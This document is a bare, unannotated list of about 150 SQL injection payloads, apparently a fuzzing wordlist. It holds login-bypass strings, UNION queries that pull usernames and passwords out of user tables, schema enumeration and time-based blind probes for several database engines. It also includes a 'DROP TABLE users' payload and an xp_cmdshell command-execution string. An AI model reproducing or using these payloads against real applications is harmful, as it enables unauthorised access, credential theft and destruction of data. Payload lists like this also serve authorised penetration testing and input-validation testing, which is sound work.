' OR 1=1--
' OR '1'='1
' OR '1'='1'--
" OR 1=1--
" OR "1"="1
admin' --
admin'#
admin'/*
admin' OR '1'='1
admin' OR 1=1--
admin' OR 'x'='x
admin' OR 'x'='x'--
' OR ''='
' OR 'a'='a
' OR TRUE--
' OR 1=1# 
' OR 1=1/*
') OR '1'='1--
') OR ('1'='1
admin') OR ('1'='1
1' OR '1'='1--
1 OR 1=1
1' OR 1=1--
admin' OR 1=CAST(1 AS CHAR)--
' OR 1=1 UNION SELECT NULL--
admin') OR 1=1--
' OR '1'='1' UNION SELECT 1--
' UNION SELECT 1--
1' UNION SELECT 1--
admin' UNION SELECT 1--
') UNION SELECT 1--
' OR 1 GROUP BY 1--
admin' OR 1=1 AND 1=1--
' OR SLEEP(5)--
' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
admin' AND 1=0 UNION SELECT 1--
' OR 1=1 LIMIT 1--
admin' OR '1'='1' LIMIT 1--
1' OR 1=1 LIMIT 1--
' AND 1=0 UNION ALL SELECT NULL,@@version--
admin' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' OR IF(1=1,SLEEP(5),0)--
admin' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--
') OR 1=1 AND ('1'='1
admin' OR EXISTS(SELECT * FROM users)--
' OR 1=1 ORDER BY 1--
admin' ORDER BY 1--
1' ORDER BY 1--
'; DROP TABLE users; --
'; SELECT * FROM users WHERE 1=1--
' UNION ALL SELECT NULL,username,password FROM users--
admin' UNION SELECT NULL,user,password FROM mysql.user--
' OR 1=1 UNION ALL SELECT NULL,table_name FROM information_schema.tables--
' OR (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--
admin' AND 1=(CASE WHEN (1=1) THEN 1 ELSE 0 END)--
' OR 1 IN (SELECT 1)--
admin' AND 1=1 AND 1=CONCAT(0x71787a7171,(SELECT table_name FROM information_schema.tables LIMIT 1),0x71787a7171)--
' OR 1=1 AND (SELECT SUBSTRING(@@version,1,1))='5'--
admin' AND LENGTH((SELECT * FROM users LIMIT 1))=10--
'; EXEC sp_executesql N'SELECT * FROM users'--
' OR 1=1; SELECT PG_SLEEP(5); --
admin' OR 1=1; SELECT COUNT(*) FROM all_tables; --
' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('A',5)=1--
admin' AND 1=(SELECT COUNT(*) FROM all_users)--
' OR 1=1 UNION SELECT banner FROM v$version--
' OR 1=1 AND CTXSYS.DRITHSX.SN(1,USER)=1--
admin' OR 1=1 AND (SELECT COUNT(*) FROM tab)>0--
1' AND 1=0 UNION SELECT table_name,column_name FROM information_schema.columns--
' OR @@version LIKE '%5.%'--
admin' AND SUBSTRING(@@version,1,1)='5'--
' OR 1=1 AND ASCII(SUBSTRING(database(),1,1))=109--
admin' OR USER_NAME()=1--
' OR 1=1 AND SYSTEM_USER=1--
admin' AND 1=DB_ID()--
'; DECLARE @a VARCHAR(99);SET @a=CAST(DB_NAME() AS VARCHAR(99));SELECT @a--
' OR 1=1; SELECT * FROM sysobjects WHERE xtype='U'; --
admin' AND 1=1 EXEC('SELECT * FROM users')--
' UNION SELECT username,password FROM members--
' OR 1=1 UNION SELECT login,pass FROM admins--
admin' OR 1=1 UNION ALL SELECT NULL,username,password,NULL FROM users--
'; SELECT * FROM users WHERE ''1''=''1--
' OR 1=1 AND 1=CONVERT(int,(SELECT @@version))--
admin' AND 1=CAST((SELECT @@version) AS int)--
' OR 1=1 AND (SELECT COUNT(*) FROM pg_class)>0--
admin' OR EXISTS(SELECT * FROM pg_user WHERE usename='postgres')--
1' AND 1=0 UNION SELECT table_name FROM user_tables--
'; BEGIN DBMS_LOCK.SLEEP(5); END; --
' OR 1=1 AND (SELECT COUNT(*) FROM dba_users)>0--
admin' OR 1=1 UNION SELECT username,password FROM dba_users--
' OR 1=1 AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())--
admin' AND 1=CONCAT(CHAR(60),CHAR(98),CHAR(111),CHAR(100),CHAR(121),CHAR(62),'hacked')--
' OR 1=1 AND 1=CAST((CHR(113)||CHR(106)||CHR(113)||CHR(98)||CHR(113))||(SELECT (ELT(1=1,database())))||CHR(113)||CHR(106)||CHR(113)||CHR(107)||CHR(113) AS CHAR)--
'; WAITFOR DELAY '0:0:5'--
admin' AND 1=1; IF 1=1 WAITFOR DELAY '0:0:5'--
' OR 1=1 AND 1=(SELECT TOP 1 1 FROM master..sysdatabases)--
admin' OR 1=1 AND EXISTS(SELECT * FROM OPENROWSET('SQLOLEDB','trusted_connection=yes';'server=localhost';'select 1'))--
' UNION ALL SELECT NULL,NULL,database(),@@version--
admin' OR 1=1 UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables--
1' OR '1'='1' AND '1'='1' AND 1=1--
' OR '1'='1' AND '1'='1' OR 1=1--
admin'-- 
admin' OR 1=1/*
admin' OR '1'='1'/*
' OR 1=1 AND '1'='1
' OR 'a'='a'--
') OR ('1'='1
" OR ""=" 
" OR "1"="1"--
1 OR 1=1--
1' OR '1'='1--
admin OR 1=1--
admin OR 1=1/*
admin' OR ''='
' OR 1=1--
' OR 0=0--
-1 OR 1=1--
-1' OR 1=1--
-1 OR 1=1--
' OR '1'='1' OR ''
admin' UNION ALL SELECT NULL--
' OR 1=1 UNION ALL SELECT NULL--
1' UNION SELECT 1--
';SELECT * FROM users--
' UNION SELECT 1,2,3--
admin' OR 1=1 UNION SELECT 1--
' OR 1 AND 1=1--
' OR (1)-- 
' OR 1#  
' OR 1/*
NULL' UNION SELECT 1--
-1' UNION SELECT 1--
' OR 1=1 UNION SELECT 1,@@version--
admin' OR 1=1 AND SLEEP(5)--
' AND 1=0 UNION SELECT 1--
' OR 1=1; SELECT * FROM users--
admin' OR 1=1 ORDER BY 1--
1' OR 1=1 ORDER BY 1--
' OR 1=1 LIMIT 1--
' OR 1=1 AND 1=1--
admin' OR EXISTS(SELECT * FROM users WHERE 1=1)--
'; EXEC xp_cmdshell('whoami')--
' OR 1=1; EXEC('SELECT * FROM users')--
